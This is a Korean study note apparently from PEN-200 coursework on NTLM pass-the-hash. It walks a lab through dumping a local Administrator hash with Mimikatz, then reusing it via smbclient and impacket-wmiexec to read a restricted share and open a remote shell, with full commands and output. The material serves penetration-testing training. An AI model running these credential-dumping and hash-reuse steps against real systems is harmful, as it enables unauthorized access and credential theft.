# 16.3.2 NTLM 패싱

> **Passing NTLM** · PEN-200 §16.3.2

앞 절은 NTLM 해시를 깼음. 그런데 패스워드가 튼튼하면 크래킹은 오래 걸리거나 아예 불가능함. **pass-the-hash(PtH)** 는 깨지 않고 그대로 쓰는 기법 — 평문 대신 「사용자명 + 유효한 NTLM 해시」 조합으로 로컬·원격 대상에 인증함.

**왜 되는가** — NTLM/LM 해시에는 salt 가 없고 세션이 바뀌어도 값이 고정이기 때문임. 여기서 더 중요한 게 따라 나옴: 한 대에서 얻은 해시를 **다른 대상에도** 쓸 수 있음. 단 그쪽에 같은 사용자명·패스워드 계정이 있어야 하고, 코드 실행까지 가려면 그 계정이 두 번째 대상에서 관리자 권한이어야 함.

⚠️ **함정 — 로컬 `Administrator` 가 아니면 조건이 더 붙음.** Vista 이후 모든 Windows 는 UAC 원격 제한이 기본 활성이라 원격 시스템에서 관리자 권한으로 소프트웨어·명령이 도는 것을 막음. 로컬 관리자 그룹에 속한 «일반» 계정은 이 제한에 걸리고, 내장 `Administrator` 계정만 비껴감. 관리자 그룹 계정의 해시를 얻었는데 코드 실행이 안 붙는다면 이 제한을 의심할 것.

실습 구도 — FILES01(192.168.50.211)에 `gunther`/`password123!` 로 이미 들어가 있음. 목표는 FILES02(192.168.50.212)의 제한된 SMB 공유 `secrets` 접근과 그 위에서의 대화형 셸임. 전제는 **두 대의 로컬 Administrator 패스워드가 같다**는 것이고, 실무 평가에서 흔히 발견되는 상황임.

탐색기 주소창에 `\\192.168.50.212\secrets` 를 넣고 `gunther` 자격 증명을 주면 접근 불가로 떨어짐 — 그 계정이 FILES02 에 없거나 공유 권한이 없다는 뜻임. 그래서 FILES01 에서 Mimikatz 로 Administrator 해시를 꺼냄(앞 절과 같은 `privilege::debug` → `token::elevate` → `lsadump::sam`).
```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # lsadump::sam
...
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...
```

PtH 를 받아 주는 도구는 여럿임 — SMB 열거·관리는 `smbclient`·CrackMapExec, 명령 실행은 impacket 의 `psexec.py`·`wmiexec.py`, Mimikatz 자체로도 가능함. SMB 뿐 아니라 RDP·WinRM 도 계정에 권한만 있으면 해시로 붙음.

먼저 공유 접근. 공유 경로는 백슬래시를 이스케이프해 첫 인자로 주고, `-U` 로 사용자, `--pw-nt-hash` 로 「뒤 값은 패스워드가 아니라 NT 해시」임을 알림. 붙은 뒤에는 `dir` 로 목록, `get` 으로 내려받기.
```
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash
7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Jun  2 16:55:35 2022
  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022
                4554239 blocks of size 4096. 771633 blocks available
smb: \> get secrets.txt

KiloBytes/sec)
```

다음은 대화형 셸. `impacket-psexec` 은 원본 Sysinternals PsExec 과 비슷하게 **쓰기 가능한 공유를 찾아 실행 파일을 올리고, 그것을 Windows 서비스로 등록해 시작**하는 구조임. 아래 출력의 `Found writable share ADMIN$` → `Uploading file` → `Creating service` → `Starting service` 가 정확히 그 순서임.

`-hashes` 의 형식은 `LMHash:NTHash` 임. **LM 해시는 쓰지 않으므로 앞자리를 0 32개로 채움** — 필드 자체는 있어야 형식이 성립하지만 값은 참조되지 않기 때문임. 두 번째 인자는 `사용자명@IP` 형식임. 명령을 뒤에 덧붙이면 대상에서 그것을 실행하고, 비우면 `cmd.exe` 가 떠 대화형 셸이 됨.

⚠️ **psexec 은 서비스로 실행하는 구조라 인증에 쓴 계정이 아니라 항상 SYSTEM 으로 셸이 떨어짐.** 인증한 계정 그대로 받고 싶으면 같은 인자로 `impacket-wmiexec` 을 씀.
```
kali@kali:~$ impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
C:\>
```

`whoami` 가 SYSTEM 이 아니라 `files02\administrator` 로 나오는 것이 psexec 과의 차이임 — 어느 쪽이 필요한지는 이후 작업에 달림.
